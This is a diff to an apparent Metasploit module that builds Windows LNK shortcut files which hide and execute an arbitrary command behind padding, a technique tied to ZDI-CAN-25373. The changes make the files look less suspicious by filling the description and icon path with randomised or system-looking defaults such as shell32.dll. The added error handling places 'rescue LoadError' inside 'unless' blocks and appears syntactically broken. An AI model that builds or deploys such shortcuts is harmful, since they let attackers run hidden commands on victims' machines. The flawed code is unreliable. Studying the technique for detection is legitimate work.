@@ -8,7 +8,7 @@ class MetasploitModule < Msf::Auxiliary
   
     def initialize(info = {})
       super(update_info(info,
-        'Name'           => 'ZDI-CAN-25373 - Windows Shortcut (LNK) Padding',
+        'Name'           => 'Windows Shortcut (LNK) Padding',
         'Description'    => %q{
           This module generates Windows LNK (shortcut) file that can execute
           arbitrary commands. The LNK file uses environment variables and execute 
@@ -18,6 +18,7 @@ class MetasploitModule < Msf::Auxiliary
         'License'        => MSF_LICENSE,
         'Author'         => [ 'Nafiez' ],
         'References'     => [
+          ['ZDI', 'ZDI-CAN-25373'],
           ['URL', 'https://zeifan.my/Windows-LNK/'],
           ['URL', 'https://gist.github.com/nafiez/1236cc4c808a489e60e2927e0407c8d1'],
           ['URL', 'https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html']
@@ -31,8 +32,8 @@ class MetasploitModule < Msf::Auxiliary
       register_options([
         OptString.new('FILENAME', [ true, 'The LNK filename to generate', 'poc.lnk' ]),
         OptString.new('COMMAND', [ true, 'Command to execute', 'C:\\Windows\\System32\\calc.exe' ]),
-        OptString.new('DESCRIPTION', [ true, 'LNK file description', 'testing purpose' ]),
-        OptString.new('ICON_PATH', [ true, 'Icon path for the LNK file', 'your_icon_path\\WindowsBackup.ico' ]),
+        OptString.new('DESCRIPTION', [ false, 'LNK file description', nil ]),
+        OptString.new('ICON_PATH', [ false, 'Icon path for the LNK file', nil]),
         OptInt.new('BUFFER_SIZE', [ true, 'Buffer size before payload', 900 ])
       ])
     end
@@ -42,6 +43,25 @@ class MetasploitModule < Msf::Auxiliary
       command = datastore['COMMAND']
       description = datastore['DESCRIPTION']
       icon_path = datastore['ICON_PATH']
+      
+      unless description && !description.empty?
+        require 'faker'
+        description = Faker::Lorem.sentence(word_count: 3) rescue nil
+        rescue LoadError
+          description = nil
+        end
+        description ||= 'Shortcut'
+      end
+
+      unless icon_path && !icon_path.empty?
+        require 'faker'
+        icon_path = File.join('%SystemRoot%\\System32', "#{Faker::File.file_name(ext: 'icon')}") rescue nil
+        rescue LoadError
+          icon_path = nil
+        end
+        icon_path ||= '%SystemRoot%\\System32\\shell32.dll'
+      end
+
       buffer_size = datastore['BUFFER_SIZE']
   
       print_status("Generating LNK file: #{filename}")
@@ -149,6 +169,6 @@ class MetasploitModule < Msf::Auxiliary
       unicode_buffer = unicode_buffer.ljust(520, "\x00".force_encoding('UTF-16LE'))[0, 520].force_encoding('ASCII-8BIT')
       data << unicode_buffer
       
-      return data
+      data
     end
   end 
